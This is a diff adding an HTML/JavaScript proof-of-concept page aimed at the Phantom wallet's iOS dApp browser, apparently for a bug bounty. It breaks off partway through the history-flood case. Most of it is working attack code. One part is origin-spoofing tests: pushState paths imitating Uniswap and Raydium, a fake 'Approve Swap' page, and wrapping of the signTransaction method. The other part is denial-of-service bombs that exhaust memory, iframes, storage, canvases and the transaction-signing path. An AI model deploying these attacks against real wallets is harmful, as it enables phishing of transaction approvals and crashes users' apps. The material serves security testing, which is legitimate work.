@@ -1,0 +1,962 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Phantom Wallet Security Test</title>
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text",system-ui,sans-serif;background:#0a0c14;color:#e2e4ed;padding:12px 10px 80px;-webkit-text-size-adjust:100%}
+  h1{font-size:16px;margin-bottom:2px}
+  .sub{font-size:10px;color:#7a829a;margin-bottom:10px}
+  .section{font-size:11px;font-weight:700;color:#ab6cff;text-transform:uppercase;letter-spacing:.6px;margin:14px 0 6px;padding-top:6px;border-top:1px solid #1a1e30}
+  .c{background:#12162a;border:1px solid #1c2040;border-radius:10px;padding:9px;margin-bottom:8px}
+  .c h2{font-size:12px;margin-bottom:3px}
+  .c p{font-size:10px;color:#9199b3;line-height:1.4;margin-bottom:7px}
+  .r{display:flex;flex-wrap:wrap;gap:4px}
+  button{background:#5b6cff;color:#fff;border:0;border-radius:7px;padding:7px 9px;font-size:11px;font-weight:600;-webkit-tap-highlight-color:rgba(91,108,255,.3)}
+  button.a{background:#1e2850}
+  button.w{background:#a03050}
+  button.g{background:#167a48}
+  .pill{display:inline-block;padding:1px 6px;border-radius:999px;font-size:8px;background:#1a1e30;color:#8088a5;margin-right:2px}
+  .log{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:9px;color:#6a7490;white-space:pre-wrap;word-break:break-all;background:#0c0f1e;padding:6px;border-radius:6px;max-height:180px;overflow:auto;border:1px solid #171c32;margin-top:5px;-webkit-overflow-scrolling:touch}
+  .ev{border-color:#4ade80!important;box-shadow:0 0 0 1px #4ade80 inset}
+  .foot{font-size:9px;color:#505670;margin-top:12px}
+  code{background:#0c0f1e;padding:1px 3px;border-radius:3px;font-size:9px}
+  a{color:#7da0ff}
+</style>
+<!-- Solana Web3.js for transaction construction -->
+<script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js"></script>
+</head>
+<body>
+
+<h1>Phantom — Origin Spoof + DoS Test</h1>
+<div class="sub">
+  <span class="pill">bbp-phantom</span>
+  <span class="pill">critical</span>
+  <span class="pill">origin-spoof</span>
+  <span class="pill">dos</span>
+</div>
+
+<!-- ============================================================ -->
+<div class="c" id="fp-card">
+  <h2>0 — Fingerprint</h2>
+  <div class="log" id="fp"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section">Origin Spoofing — Transaction Approval Popup (Critical $12.5k-$20k)</div>
+
+<div class="c">
+  <h2>OS-1 — about:blank origin inheritance</h2>
+  <p><code>window.open("about:blank")</code>, write dApp code, call
+     <code>signTransaction()</code>. Test what origin Phantom shows in the
+     approval popup. If it inherits the opener origin or shows blank,
+     the attacker controls what the user sees.</p>
+  <div class="r">
+    <button onclick="run('OS1')">OS-1: Run</button>
+    <button class="a" onclick="cl('los1')">clear</button>
+  </div>
+  <div class="log" id="los1"></div>
+</div>
+
+<div class="c">
+  <h2>OS-2 — blob: URI origin in approval</h2>
+  <p>Create <code>blob:</code> URL with dApp code. Phantom may show
+     <code>blob:https://...</code> or just the origin part in approval.
+     Any ambiguity = origin confusion for the user.</p>
+  <div class="r">
+    <button onclick="run('OS2')">OS-2: Run</button>
+    <button class="a" onclick="cl('los2')">clear</button>
+  </div>
+  <div class="log" id="los2"></div>
+</div>
+
+<div class="c">
+  <h2>OS-3 — history.pushState before signing</h2>
+  <p>Load page, <code>pushState("/app.uniswap.org/swap")</code>, then call
+     <code>connect()</code> + <code>signTransaction()</code>. If Phantom reads
+     origin from <code>webView.url</code> at call time, the path in the popup
+     may show the pushed path, confusing the user.</p>
+  <div class="r">
+    <button onclick="run('OS3')">OS-3: pushState</button>
+    <button class="a" onclick="run('OS3B')">OS-3B: replaceState</button>
+    <button class="a" onclick="cl('los3')">clear</button>
+  </div>
+  <div class="log" id="los3"></div>
+</div>
+
+<div class="c">
+  <h2>OS-4 — iframe cross-origin tx request</h2>
+  <p>Load trusted dApp (raydium.io) in visible iframe, attacker page as parent.
+     Test if Phantom's provider in the iframe is accessible from parent, or if
+     the approval popup shows the iframe origin vs parent origin.</p>
+  <div class="r">
+    <button onclick="run('OS4')">OS-4: iframe test</button>
+    <button class="a" onclick="cl('los4')">clear</button>
+  </div>
+  <div class="log" id="los4"></div>
+</div>
+
+<div class="c">
+  <h2>OS-5 — Connect as site A, sign from site B</h2>
+  <p>Connect wallet on current page, then navigate to a different origin and
+     check if the wallet session persists. If Phantom doesn't re-validate
+     origin on signing, the approval popup may show stale origin info.</p>
+  <div class="r">
+    <button onclick="run('OS5A')">OS-5A: Connect first</button>
+    <button class="a" onclick="run('OS5B')">OS-5B: Navigate + sign</button>
+    <button class="a" onclick="cl('los5')">clear</button>
+  </div>
+  <div class="log" id="los5"></div>
+</div>
+
+<div class="c">
+  <h2>OS-6 — data: URI with Solana provider</h2>
+  <p>Navigate to <code>data:text/html,...</code> containing dApp code.
+     If Phantom injects provider into data: URIs, the origin in the
+     approval popup would be <code>null</code> or missing — user cannot
+     verify what site is requesting the transaction.</p>
+  <div class="r">
+    <button onclick="run('OS6')">OS-6: Run</button>
+    <button class="a" onclick="cl('los6')">clear</button>
+  </div>
+  <div class="log" id="los6"></div>
+</div>
+
+<div class="c">
+  <h2>OS-7 — srcdoc iframe origin</h2>
+  <p>Iframe with <code>srcdoc</code> containing dApp code. The origin of srcdoc
+     iframes is <code>null</code> but Phantom may display the parent page origin
+     in the approval popup — making it look like the parent site requested the tx.</p>
+  <div class="r">
+    <button onclick="run('OS7')">OS-7: Run</button>
+    <button class="a" onclick="cl('los7')">clear</button>
+  </div>
+  <div class="log" id="los7"></div>
+</div>
+
+<div class="c">
+  <h2>OS-8 — postMessage provider hijack</h2>
+  <p>Phantom's provider communicates with the native app via postMessage or
+     webkit.messageHandlers. Intercept and replay/modify these messages to
+     spoof the origin field sent to the native approval UI.</p>
+  <div class="r">
+    <button onclick="run('OS8')">OS-8: Intercept</button>
+    <button class="a" onclick="cl('los8')">clear</button>
+  </div>
+  <div class="log" id="los8"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="section">Denial of Service — Wallet Crash/Freeze (Medium $1.5k-$5k)</div>
+
+<div class="c">
+  <h2>DOS-1 — WebView memory bomb</h2>
+  <p>Rapid allocation of large <code>ArrayBuffer</code>s until WebView or
+     Phantom app crashes due to memory pressure. iOS will kill the process.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS1')">DOS-1: Memory bomb</button>
+    <button class="a" onclick="cl('ldos1')">clear</button>
+  </div>
+  <div class="log" id="ldos1"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-2 — Recursive iframe bomb</h2>
+  <p>Each iframe creates another iframe. Exponential growth crashes
+     the WKWebView process.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS2')">DOS-2: iframe bomb</button>
+    <button class="a" onclick="cl('ldos2')">clear</button>
+  </div>
+  <div class="log" id="ldos2"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-3 — Transaction simulation flood</h2>
+  <p>Rapidly fire <code>signTransaction()</code> / <code>signAllTransactions()</code>
+     in a loop. Each call triggers Phantom's native simulation engine +
+     approval UI. Hundreds of simultaneous requests may exhaust the
+     simulation backend or freeze the UI thread.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS3')">DOS-3: Tx flood</button>
+    <button class="a" onclick="cl('ldos3')">clear</button>
+  </div>
+  <div class="log" id="ldos3"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-4 — Malformed transaction crash</h2>
+  <p>Send transactions with invalid/oversized data to
+     <code>signTransaction()</code>. Malformed instructions, huge memo
+     fields, or impossible account references may crash the transaction
+     parser or simulation engine.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS4')">DOS-4: Malformed tx</button>
+    <button class="a" onclick="cl('ldos4')">clear</button>
+  </div>
+  <div class="log" id="ldos4"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-5 — localStorage / IndexedDB bomb</h2>
+  <p>Fill all available storage. May prevent Phantom from saving state,
+     crash the app on restart, or corrupt cached data.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS5')">DOS-5: Storage bomb</button>
+    <button class="a" onclick="cl('ldos5')">clear</button>
+  </div>
+  <div class="log" id="ldos5"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-6 — Canvas/WebGL OOM</h2>
+  <p>Create massive canvas elements or WebGL contexts. GPU memory
+     exhaustion can crash WKWebView or the entire Phantom app on iOS.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS6')">DOS-6: Canvas bomb</button>
+    <button class="a" onclick="cl('ldos6')">clear</button>
+  </div>
+  <div class="log" id="ldos6"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-7 — History API flood</h2>
+  <p>Rapid <code>history.pushState()</code> in a tight loop. WKWebView
+     allocates memory for each entry. Combined with large state objects,
+     this can exhaust memory.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS7')">DOS-7: History flood</button>
+    <button class="a" onclick="cl('ldos7')">clear</button>
+  </div>
+  <div class="log" id="ldos7"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-8 — phantom:// deeplink bomb</h2>
+  <p>Rapid-fire <code>phantom://</code> scheme navigations via hidden
+     iframes. Each one triggers Phantom's native URL handler. Hundreds
+     in quick succession may freeze the app's main thread.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS8')">DOS-8: Deeplink bomb</button>
+    <button class="a" onclick="cl('ldos8')">clear</button>
+  </div>
+  <div class="log" id="ldos8"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-9 — signMessage infinite loop</h2>
+  <p>Call <code>signMessage()</code> immediately after user rejects.
+     Creates an infinite approval popup loop that the user cannot escape —
+     every dismiss triggers a new popup.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS9')">DOS-9: Popup loop</button>
+    <button class="a" onclick="stopLoop();cl('ldos9')">STOP + clear</button>
+  </div>
+  <div class="log" id="ldos9"></div>
+</div>
+
+<div class="c">
+  <h2>DOS-10 — WebSocket exhaustion</h2>
+  <p>Open 200+ WebSocket connections to Solana RPC endpoints.
+     Phantom may share the connection pool — exhausting it blocks
+     the wallet from communicating with the chain.</p>
+  <div class="r">
+    <button class="w" onclick="run('DOS10')">DOS-10: WS flood</button>
+    <button class="a" onclick="cl('ldos10')">clear</button>
+  </div>
+  <div class="log" id="ldos10"></div>
+</div>
+
+<!-- ============================================================ -->
+<div class="c" id="ev-card">
+  <h2>Evidence</h2>
+  <div class="log" id="evidence"></div>
+</div>
+
+<div class="foot">
+  Phantom Managed BBP (Bugcrowd). Authorized testing only.
+</div>
+
+<script>
+/* ============================================================
+ * Phantom Wallet — Origin Spoof + DoS PoC
+ * Target: Phantom iOS (WKWebView dApp browser)
+ * Engagement: Phantom Managed BBP on Bugcrowd
+ * ============================================================ */
+
+var solanaWeb3 = window.solanaWeb3 || {};
+var Connection = solanaWeb3.Connection;
+var Transaction = solanaWeb3.Transaction;
+var SystemProgram = solanaWeb3.SystemProgram;
+var PublicKey = solanaWeb3.PublicKey;
+var LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL || 1000000000;
+
+var BURN_ADDR = "1nc1nerator11111111111111111111111111111111"; /* burn address */
+var RPC = "https://api.mainnet-beta.solana.com";
+
+var provider = null;
+var pubkey = null;
+var LOOP_ACTIVE = false;
+
+/* ---------- utils -------------------------------------------- */
+function $(id){return document.getElementById(id)}
+function ts(){return new Date().toISOString().substr(11,12)}
+function log(id,s){var e=$(id);if(!e)return;e.textContent+="["+ts()+"] "+s+"\n";e.scrollTop=e.scrollHeight}
+function cl(id){if($(id))$(id).textContent=""}
+function ev(s){log("evidence",s);$("ev-card").classList.add("ev")}
+function stopLoop(){LOOP_ACTIVE=false}
+
+/* ---------- fingerprint -------------------------------------- */
+(function(){
+  var ua=navigator.userAgent||"";
+  var isiOS=/iPhone|iPad|iPod/.test(ua);
+  var isPhantom=!!(window.phantom&&window.phantom.solana)||!!(window.solana&&window.solana.isPhantom);
+  var hasSolana=!!window.solana;
+  var hasPhantom=!!window.phantom;
+  var isWK=!!(window.webkit&&window.webkit.messageHandlers);
+
+  provider=(window.phantom&&window.phantom.solana)||window.solana||null;
+
+  log("fp","ua = "+ua.slice(0,100));
+  log("fp","iOS = "+isiOS);
+  log("fp","WKWebView = "+isWK);
+  log("fp","phantom.solana = "+!!(window.phantom&&window.phantom.solana));
+  log("fp","window.solana = "+hasSolana);
+  log("fp","isPhantom = "+isPhantom);
+  log("fp","provider = "+(provider?"FOUND":"NOT FOUND"));
+
+  if(isPhantom)$("fp-card").classList.add("ev");
+  if(!provider) log("fp","WARNING: No Solana provider — open this page inside Phantom dApp browser");
+
+  /* enumerate webkit handlers */
+  if(isWK){
+    try{
+      var h=Object.keys(window.webkit.messageHandlers);
+      log("fp","webkit handlers = "+h.join(", "));
+    }catch(e){}
+  }
+})();
+
+/* ---------- helper: connect wallet --------------------------- */
+async function ensureConnected(tag){
+  if(!provider){log(tag,"no provider");return false}
+  try{
+    if(!pubkey){
+      log(tag,"connecting wallet...");
+      var resp=await provider.connect();
+      pubkey=resp.publicKey;
+      log(tag,"connected: "+pubkey.toString());
+      ev("wallet connected: "+pubkey.toString());
+    }
+    return true;
+  }catch(e){
+    log(tag,"connect rejected: "+e.message);
+    return false;
+  }
+}
+
+/* ---------- helper: build a transfer tx ---------------------- */
+async function buildTx(tag){
+  if(!pubkey){log(tag,"not connected");return null}
+  try{
+    var conn=new Connection(RPC);
+    var bh=await conn.getLatestBlockhash();
+    var tx=new Transaction();
+    tx.add(SystemProgram.transfer({
+      fromPubkey:pubkey,
+      toPubkey:new PublicKey(BURN_ADDR),
+      lamports:1 /* 1 lamport = negligible, safe for testing */
+    }));
+    tx.recentBlockhash=bh.blockhash;
+    tx.feePayer=pubkey;
+    return tx;
+  }catch(e){
+    log(tag,"buildTx err: "+e.message);
+    return null;
+  }
+}
+
+/* ---------- dApp page HTML (for injection into blob/about:blank) */
+function dappHTML(label){
+  return '<!doctype html><html><head><meta charset=utf-8>'
+    +'<meta name=viewport content="width=device-width,initial-scale=1">'
+    +'<title>Uniswap</title>'
+    +'<style>body{margin:0;padding:30px 16px;font-family:-apple-system,sans-serif;background:#191b1f;color:#fff;text-align:center}'
+    +'h1{font-size:20px;margin-bottom:8px}p{font-size:12px;color:#8a8fa0;margin-bottom:16px}'
+    +'button{background:#4c82fb;color:#fff;border:0;border-radius:12px;padding:12px 20px;font-size:14px;font-weight:600;width:100%;max-width:300px}'
+    +'.log{font-family:monospace;font-size:9px;color:#6a7;background:#111;padding:8px;border-radius:6px;margin-top:12px;text-align:left;max-height:150px;overflow:auto}</style>'
+    +'</head><body>'
+    +'<h1>Uniswap</h1>'
+    +'<p>'+label+'</p>'
+    +'<button id=btn>Approve Swap</button>'
+    +'<div class=log id=lg></div>'
+    +'<scr'+'ipt>'
+    +'var lg=document.getElementById("lg");'
+    +'function l(s){lg.textContent+=s+"\\n"}'
+    +'l("origin = "+location.origin);'
+    +'l("href = "+location.href);'
+    +'l("host = "+location.host);'
+    +'l("provider = "+!!(window.phantom&&window.phantom.solana));'
+    +'var p=(window.phantom&&window.phantom.solana)||window.solana;'
+    +'if(!p){l("NO PROVIDER — Phantom did not inject into this context");}'
+    +'else{'
+    +'  l("PROVIDER FOUND — attempting connect...");'
+    +'  document.getElementById("btn").onclick=async function(){'
+    +'    try{'
+    +'      var r=await p.connect();'
+    +'      l("CONNECTED: "+r.publicKey.toString());'
+    +'      l(">>> SCREENSHOT THE APPROVAL POPUP <<<");'
+    +'      l(">>> CHECK WHAT ORIGIN PHANTOM SHOWS <<<");'
+    +'    }catch(e){l("rejected: "+e.message)}'
+    +'  };'
+    +'  /* auto-connect after 1s */'
+    +'  setTimeout(async function(){'
+    +'    try{var r=await p.connect();l("auto-connect: "+r.publicKey.toString())}catch(e){l("auto err: "+e.message)}'
+    +'  },1000);'
+    +'}'
+    +'</scr'+'ipt></body></html>';
+}
+
+/* ============================================================
+ * CASE RUNNERS
+ * ============================================================ */
+async function run(c){
+  var t="l"+c.toLowerCase().replace("-","");
+  if(!$(t)) t="l"+c.toLowerCase().replace(/\d+$/,"").replace("-","");
+  log(t,"==== "+c+" ====");
+
+  switch(c){
+
+  /* ============ ORIGIN SPOOFING ============ */
+
+  /* OS-1: about:blank — does Phantom inject provider? what origin in popup? */
+  case "OS1":{
+    log(t,"opening about:blank child window...");
+    try{
+      var w=window.open("about:blank","_blank");
+      if(!w){log(t,"popup blocked");break}
+      setTimeout(function(){
+        try{
+          w.document.open();
+          w.document.write(dappHTML(
+            "Origin test: about:blank<br>If Phantom shows no origin or inherits opener origin, this is an origin spoof."
+          ));
+          w.document.close();
+          log(t,"wrote dApp code into about:blank window");
+          log(t,"CHECK: does Phantom inject provider into about:blank?");
+          log(t,"CHECK: what origin does approval popup show?");
+          log(t,"EXPECTED for spoof: popup shows blank/null origin OR opener origin");
+        }catch(e){log(t,"write err: "+e)}
+      },400);
+    }catch(e){log(t,"err: "+e)}
+    break;
+  }
+
+  /* OS-2: blob: URI */
+  case "OS2":{
+    var html=dappHTML(
+      "Origin test: blob: URI<br>Approval popup may show blob:https://... or just the origin."
+    );
+    var blob=new Blob([html],{type:"text/html"});
+    var burl=URL.createObjectURL(blob);
+    log(t,"blob URL = "+burl.slice(0,60));
+    log(t,"navigating to blob...");
+    log(t,"CHECK: does Phantom inject provider into blob: page?");
+    log(t,"CHECK: what origin does approval popup show?");
+    window.location.href=burl;
+    break;
+  }
+
+  /* OS-3: pushState before signing */
+  case "OS3":{
+    if(!(await ensureConnected(t))) break;
+    log(t,"pushState to /app.uniswap.org/swap...");
+    try{
+      history.pushState({},"Uniswap","/app.uniswap.org/swap?inputCurrency=SOL&outputCurrency=USDC");
+      document.title="Uniswap | Swap";
+      log(t,"URL now = "+location.href);
+      log(t,"triggering signTransaction...");
+      var tx=await buildTx(t);
+      if(!tx) break;
+      log(t,">>> SCREENSHOT THE APPROVAL POPUP NOW <<<");
+      log(t,">>> Check if origin shows /app.uniswap.org/swap <<<");
+      var signed=await provider.signTransaction(tx);
+      log(t,"signed (reject next time if real wallet): "+signed);
+    }catch(e){log(t,"err: "+e.message)}
+    break;
+  }
+  case "OS3B":{
+    if(!(await ensureConnected(t))) break;
+    try{
+      history.replaceState({},"","https://"+location.host+"/raydium.io/swap/");
+      document.title="Raydium | Swap";
+      log(t,"replaceState -> "+location.href);
+      var tx=await buildTx(t);
+      if(!tx) break;
+      log(t,">>> SCREENSHOT APPROVAL POPUP <<<");
+      await provider.signTransaction(tx);
+    }catch(e){log(t,"err: "+e.message)}
+    break;
+  }
+
+  /* OS-4: iframe origin confusion */
+  case "OS4":{
+    log(t,"creating iframe with dApp code (srcdoc)...");
+    var f=document.createElement("iframe");
+    f.style.cssText="width:100%;height:400px;border:1px solid #333;border-radius:8px;margin-top:6px";
+    f.srcdoc=dappHTML(
+      "Origin test: srcdoc iframe<br>srcdoc origin is null. Check if Phantom shows parent origin in popup."
+    );
+    $(t).parentNode.appendChild(f);
+    log(t,"iframe added. Tap 'Approve Swap' inside it.");
+    log(t,"CHECK: does popup show parent origin (ajaone.github.io) or null?");
+    log(t,"If parent origin shown = origin spoof (attacker page gets credit for iframe tx)");
+    break;
+  }
+
+  /* OS-5: connect then navigate */
+  case "OS5A":{
+    if(!(await ensureConnected(t))) break;
+    log(t,"wallet connected as: "+pubkey.toString());
+    log(t,"now tap OS-5B to navigate and attempt signing from different context");
+    break;
+  }
+  case "OS5B":{
+    log(t,"pushing state to simulate navigation...");
+    history.pushState({},"","https://"+location.host+"/phantom.app/swap");
+    document.title="Phantom Swap";
+    log(t,"URL = "+location.href);
+    if(provider && pubkey){
+      log(t,"provider still alive after pushState, building tx...");
+      try{
+        var tx=await buildTx(t);
+        if(!tx) break;
+        log(t,">>> SCREENSHOT: what origin in popup after pushState? <<<");
+        await provider.signTransaction(tx);
+      }catch(e){log(t,"err: "+e.message)}
+    }else{
+      log(t,"provider lost — Phantom re-validates on navigation");
+    }
+    break;
+  }
+
+  /* OS-6: data: URI */
+  case "OS6":{
+    var html2=dappHTML("Origin test: data: URI<br>If provider exists here, origin in popup would be null/empty.");
+    var d="data:text/html;base64,"+btoa(html2);
+    log(t,"navigating to data: URI...");
+    log(t,"CHECK: does Phantom inject provider into data: pages?");
+    window.location.href=d;
+    break;
+  }
+
+  /* OS-7: srcdoc iframe with auto-connect */
+  case "OS7":{
+    log(t,"creating sandboxed srcdoc iframe...");
+    var f2=document.createElement("iframe");
+    f2.style.cssText="width:100%;height:400px;border:1px solid #333;border-radius:8px;margin-top:6px";
+    f2.setAttribute("sandbox","allow-scripts allow-same-origin allow-popups");
+    f2.srcdoc=dappHTML(
+      "Origin test: sandboxed srcdoc iframe (allow-same-origin)<br>Check origin in popup."
+    );
+    $(t).parentNode.appendChild(f2);
+    log(t,"sandbox iframe added with allow-same-origin");
+    log(t,"if provider found inside = it uses parent origin");
+    break;
+  }
+
+  /* OS-8: postMessage / webkit.messageHandlers intercept */
+  case "OS8":{
+    log(t,"scanning for Phantom communication channels...");
+
+    /* Monitor all postMessage traffic */
+    window.addEventListener("message",function(e){
+      var data=typeof e.data==="string"?e.data:JSON.stringify(e.data);
+      if(data.length>300) data=data.slice(0,300)+"...";
+      log(t,"postMessage from "+e.origin+": "+data);
+      ev("intercepted postMessage: "+data.slice(0,100));
+    });
+    log(t,"postMessage listener installed");
+
+    /* Check webkit messageHandlers */
+    if(window.webkit&&window.webkit.messageHandlers){
+      var handlers=[];
+      var names=["phantom","solana","ethereum","wallet","bridge","controller",
+                  "callback","response","request","native","app","event",
+                  "navigation","log","analytics","interop","rpc"];
+      names.forEach(function(n){
+        try{
+          if(window.webkit.messageHandlers[n]){
+            handlers.push(n);
+            log(t,"FOUND handler: webkit.messageHandlers."+n);
+          }
+        }catch(e){}
+      });
+      if(handlers.length===0) log(t,"no named handlers found in standard list");
+    }
+
+    /* Try to intercept provider methods */
+    if(provider){
+      var origSign=provider.signTransaction;
+      if(origSign){
+        log(t,"wrapping provider.signTransaction to log calls...");
+        provider.signTransaction=async function(tx){
+          log(t,"INTERCEPTED signTransaction call!");
+          log(t,"tx instructions: "+tx.instructions.length);
+          ev("signTransaction intercepted — attacker could modify tx here");
+          return origSign.call(provider,tx);
+        };
+        log(t,"provider.signTransaction wrapped — try signing a tx now");
+      }
+
+      /* Check if provider exposes internal methods */
+      log(t,"provider keys: "+Object.keys(provider).join(", "));
+      log(t,"provider.isPhantom = "+provider.isPhantom);
+      log(t,"provider.isConnected = "+provider.isConnected);
+
+      /* Check for event emitter */
+      if(provider._events){
+        log(t,"provider._events = "+Object.keys(provider._events).join(", "));
+      }
+    }
+
+    /* Trigger a connect to generate traffic */
+    if(provider){
+      log(t,"triggering connect to generate message traffic...");
+      provider.connect().then(function(r){
+        log(t,"connected: "+r.publicKey.toString());
+      }).catch(function(e){log(t,"connect err: "+e.message)});
+    }
+    break;
+  }
+
+  /* ============ DENIAL OF SERVICE ============ */
+
+  /* DOS-1: memory bomb */
+  case "DOS1":{
+    log(t,"starting memory allocation bomb...");
+    var chunks=[];
+    var total=0;
+    var iv=setInterval(function(){
+      try{
+        /* Allocate 64MB per tick */
+        var buf=new ArrayBuffer(64*1024*1024);
+        /* Touch the memory so it's actually committed */
+        new Uint8Array(buf).fill(0xFF);
+        chunks.push(buf);
+        total+=64;
+        log(t,"allocated "+total+"MB...");
+        if(total>=4096){
+          clearInterval(iv);
+          log(t,"reached 4GB — app should be dead by now");
+        }
+      }catch(e){
+        clearInterval(iv);
+        log(t,"allocation failed at "+total+"MB: "+e);
+        ev("DOS-1: memory exhaustion at "+total+"MB");
+      }
+    },50);
+    break;
+  }
+
+  /* DOS-2: recursive iframe bomb */
+  case "DOS2":{
+    log(t,"starting iframe bomb...");
+    var count=0;
+    function bomb(parent){
+      for(var i=0;i<5;i++){
+        var f=document.createElement("iframe");
+        f.srcdoc='<scr'+'ipt>for(var i=0;i<5;i++){var f=document.createElement("iframe");f.srcdoc=document.documentElement.outerHTML;document.body.appendChild(f)}</scr'+'ipt>';
+        parent.appendChild(f);
+        count++;
+      }
+      log(t,"iframes: "+count);
+      if(count<2000) setTimeout(function(){bomb(parent)},10);
+      else ev("DOS-2: created "+count+" recursive iframes");
+    }
+    bomb(document.body);
+    break;
+  }
+
+  /* DOS-3: transaction simulation flood */
+  case "DOS3":{
+    if(!(await ensureConnected(t))) break;
+    log(t,"building flood transactions...");
+    var conn=new Connection(RPC);
+    var bh;
+    try{bh=await conn.getLatestBlockhash()}catch(e){log(t,"rpc err: "+e.message);break}
+
+    log(t,"flooding signTransaction (100 rapid calls)...");
+    var sent=0,err=0;
+    for(var i=0;i<100;i++){
+      (function(idx){
+        try{
+          var tx=new Transaction();
+          tx.add(SystemProgram.transfer({
+            fromPubkey:pubkey,
+            toPubkey:new PublicKey(BURN_ADDR),
+            lamports:idx+1
+          }));
+          tx.recentBlockhash=bh.blockhash;
+          tx.feePayer=pubkey;
+          provider.signTransaction(tx).then(function(){sent++}).catch(function(){err++});
+        }catch(e){err++}
+      })(i);
+    }
+    setTimeout(function(){
+      log(t,"flood done: "+sent+" signed, "+err+" errors/rejects");
+      ev("DOS-3: fired 100 signTransaction calls");
+    },5000);
+    break;
+  }
+
+  /* DOS-4: malformed transaction */
+  case "DOS4":{
+    if(!(await ensureConnected(t))) break;
+    log(t,"sending malformed transactions...");
+
+    /* 4a: huge memo */
+    try{
+      var tx1=new Transaction();
+      var bigMemo=new Array(10000).fill("A").join("");
+      tx1.add({
+        keys:[{pubkey:pubkey,isSigner:true,isWritable:false}],
+        programId:new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
+        data:Buffer.from(bigMemo)
+      });
+      var conn2=new Connection(RPC);
+      var bh2=await conn2.getLatestBlockhash();
+      tx1.recentBlockhash=bh2.blockhash;
+      tx1.feePayer=pubkey;
+      log(t,"sending tx with 10KB memo...");
+      provider.signTransaction(tx1).catch(function(e){log(t,"memo tx err: "+e.message)});
+    }catch(e){log(t,"memo build err: "+e.message)}
+
+    /* 4b: max instructions */
+    try{
+      var tx2=new Transaction();
+      for(var j=0;j<50;j++){
+        tx2.add(SystemProgram.transfer({
+          fromPubkey:pubkey,
+          toPubkey:new PublicKey(BURN_ADDR),
+          lamports:1
+        }));
+      }
+      var bh3=await (new Connection(RPC)).getLatestBlockhash();
+      tx2.recentBlockhash=bh3.blockhash;
+      tx2.feePayer=pubkey;
+      log(t,"sending tx with 50 instructions...");
+      provider.signTransaction(tx2).catch(function(e){log(t,"multi-ix err: "+e.message)});
+    }catch(e){log(t,"multi-ix build err: "+e.message)}
+
+    /* 4c: invalid program ID */
+    try{
+      var tx3=new Transaction();
+      tx3.add({
+        keys:[{pubkey:pubkey,isSigner:true,isWritable:true}],
+        programId:pubkey, /* user's own pubkey as program — guaranteed invalid */
+        data:Buffer.from(new Uint8Array(900).fill(0xFF))
+      });
+      var bh4=await (new Connection(RPC)).getLatestBlockhash();
+      tx3.recentBlockhash=bh4.blockhash;
+      tx3.feePayer=pubkey;
+      log(t,"sending tx with invalid programId...");
+      provider.signTransaction(tx3).catch(function(e){log(t,"bad program err: "+e.message)});
+    }catch(e){log(t,"bad program build err: "+e.message)}
+
+    ev("DOS-4: sent 3 malformed transaction variants");
+    break;
+  }
+
+  /* DOS-5: storage bomb */
+  case "DOS5":{
+    log(t,"filling localStorage...");
+    var stored=0;
+    var chunk=new Array(1024*1024+1).join("X"); /* ~1MB string */
+    try{
+      for(var k=0;k<200;k++){
+        localStorage.setItem("bomb_"+k,chunk);
+        stored++;
+      }
+    }catch(e){
+      log(t,"localStorage full at "+stored+"MB: "+e.message);
+    }
+    log(t,"filling IndexedDB...");
+    try{
+      var req=indexedDB.open("bomb_db",1);
+      req.onupgradeneeded=function(e){
+        var db=e.target.result;
+        db.createObjectStore("data",{keyPath:"id"});
+      };
+      req.onsuccess=function(e){
+        var db=e.target.result;
+        var txn=db.transaction("data","readwrite");
+        var store=txn.objectStore("data");
+        var idbStored=0;
+        for(var m=0;m<500;m++){
+          try{
+            store.put({id:m,data:new ArrayBuffer(1024*1024)});
+            idbStored++;
+          }catch(ex){break}
+        }
+        txn.oncomplete=function(){
+          log(t,"IndexedDB: stored "+idbStored+"MB");
+          ev("DOS-5: localStorage "+stored+"MB + IDB "+idbStored+"MB");
+        };
+        txn.onerror=function(){log(t,"IDB txn error")};
+      };
+    }catch(e){log(t,"IDB err: "+e.message)}
+    break;
+  }
+
+  /* DOS-6: canvas/WebGL bomb */
+  case "DOS6":{
+    log(t,"creating oversized canvases...");
+    var canvases=0;
+    var iv2=setInterval(function(){
+      try{
+        var c=document.createElement("canvas");
+        c.width=8192;c.height=8192; /* 256MB per canvas at 32bpp */
+        var ctx=c.getContext("2d");
+        if(ctx){
+          ctx.fillStyle="#FF0000";
+          ctx.fillRect(0,0,8192,8192); /* force pixel allocation */
+        }
+        document.body.appendChild(c);
+        canvases++;
+        log(t,"canvas #"+canvases+" (8192x8192)");
+        if(canvases>=50){
+          clearInterval(iv2);
+          ev("DOS-6: created "+canvases+" canvases (~12.8GB pixel data)");
+        }
+      }catch(e){
+        clearInterval(iv2);
+        log(t,"canvas failed at #"+canvases+": "+e);
+        ev("DOS-6: canvas OOM at "+canvases+" canvases");
+      }
+    },100);
+    break;
+  }
+
+  /* DOS-7: history flood */
+  case "DOS7":{
+    log(t,"flooding history.pushState...");
+    var pushed=0;
+    var bigState={data:new Array(100000).join("X")}; /* ~100KB per entry */
